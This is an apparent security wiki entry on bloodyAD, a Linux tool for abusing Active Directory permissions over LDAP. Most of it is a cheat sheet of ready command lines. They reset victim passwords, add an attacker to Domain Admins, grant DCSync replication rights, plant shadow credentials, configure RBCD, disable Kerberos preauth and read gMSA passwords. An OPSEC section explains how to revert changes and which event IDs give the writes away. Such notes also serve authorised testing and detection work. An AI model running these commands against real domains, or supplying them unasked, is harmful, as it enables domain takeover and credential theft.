---
title: "bloodyAD — Linux AD privesc / DACL-abuse framework"
type: entity
created: 2026-09-07
updated: 2026-09-07
tags: [tool, python, active-directory, acl, ldap, privilege-escalation]
---

# bloodyAD

**bloodyAD** (by CravateRouge) is a Python framework for **interacting with and
abusing Active Directory over LDAP/LDAPS/SAMR from Linux** — the modern
one-stop tool for the whole [[acl-abuse|ACL/attribute-write]] chain without
touching PowerView on a Windows host. It reads and *writes* directory objects:
reset passwords, add computers, set RBCD, plant shadow credentials, flip UAC
bits, take ownership, and **grant yourself DCSync** — each as a one-liner, and
each with a matching `remove` for clean revert. It's what most Linux operators
now reach for to *cash in* a BloodHound ACL edge.

## Auth & shape

```bash
# bloodyAD --host <dc-fqdn> -d <domain> -u <user> <auth> <verb> <object> [args]
bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Pass' get writable
bloodyAD --host dc01.corp.local -d corp.local -u user -p :<nthash> ...     # PtH
bloodyAD --host dc01.corp.local -d corp.local -u user -k ...               # Kerberos ($KRB5CCNAME)
bloodyAD --host dc01.corp.local -d corp.local -c ':cert.pem' ...           # cert / PKINIT
```

`get writable` is the killer recon verb — it tells you **exactly which objects
and attributes your principal can write**, i.e. which ACL edges you actually
hold, pairing directly with [[bloodhound]] / [[rusthound]].

## The abuse verbs (cash in an edge)

```bash
# Reset a password (GenericAll / ForceChangePassword on a user)
bloodyAD ... set password TARGETUSER 'Newpass123!'

# Add yourself to a group (GenericAll / GenericWrite 'member')
bloodyAD ... add groupMember 'Domain Admins' attacker

# Grant yourself DCSync (WriteDacl on the domain head -> replication ACEs)
bloodyAD ... add dcsync attacker            # then secretsdump ([[dcsync]])

# Shadow Credentials (WriteProperty msDS-KeyCredentialLink) -> cert -> NT hash
bloodyAD ... add shadowCredentials TARGET   # ([[shadow-credentials]])

# RBCD (write msDS-AllowedToActOnBehalfOfOtherIdentity)
bloodyAD ... add rbcd TARGETCOMPUTER$ ATTACKERCOMPUTER$   # ([[resource-based-constrained-delegation]])

# Flip UAC bits: e.g. disable preauth for targeted AS-REP roast
bloodyAD ... add uac TARGETUSER -f DONT_REQ_PREAUTH        # ([[targeted-roasting]])

# Take ownership (WriteOwner) then grant self control
bloodyAD ... set owner TARGET attacker
bloodyAD ... add genericAll TARGET attacker

# Add a computer (needs MachineAccountQuota) -> RBCD / [[nopac]]
bloodyAD ... add computer FAKE 'ComputerPass123!'

# Read a gMSA managed password over LDAP
bloodyAD ... get object 'svc_gmsa$' --attr msDS-ManagedPassword   # ([[gmsadumper]])
```

Every `add` has a `remove` (e.g. `remove groupMember`, `remove dcsync`,
`remove uac`) — use them to revert.

## Why it's the go-to

- **One tool, whole chain, from Linux** — recon (`get writable`/`get children`/
  `get dnsDump`/`get trusts`) *and* every write primitive, over the tunnel
  ([[pivoting-and-tunneling]]); no on-host PowerView, no Windows foothold needed.
- Cleaner than stitching `dacledit.py` + `owneredit.py` + `addcomputer.py` +
  `pywhisker` + `rbcd.py` together — bloodyAD is the single interface for all of
  them.

## OPSEC / detection

- The writes are the usual ACL/attribute tells: **4670** (DACL changed) and
  **5136** (object modified — `member`, `msDS-KeyCredentialLink`,
  `msDS-AllowedToActOnBehalfOfOtherIdentity`, `userAccountControl`, replication
  ACEs on the domain head). Make the change, use it, **`remove` it**.
- `add dcsync` is high-signal (a WriteDacl on the domain object granting
  replication rights) — expect it to stand out; pair with the [[dcsync]]
  detection notes.
- Reads (`get writable`, gMSA blob) are far quieter than the writes.

## Links

- [[acl-abuse]] — the edges bloodyAD exploits (this is the tooling for that page)
- [[dcsync]] — `add dcsync` grants replication rights, then dump
- [[shadow-credentials]] — `add shadowCredentials`
- [[resource-based-constrained-delegation]] — `add rbcd`
- [[targeted-roasting]] — `add uac`/SPN writes to make a victim roastable
- [[nopac]] — `add computer` + rename primitive
- [[gmsadumper]] — bloodyAD also reads gMSA managed passwords
- [[bloodhound]] / [[rusthound]] — where you find the edges bloodyAD cashes in

## References

- [bloodyAD (GitHub)](https://github.com/CravateRouge/bloodyAD)
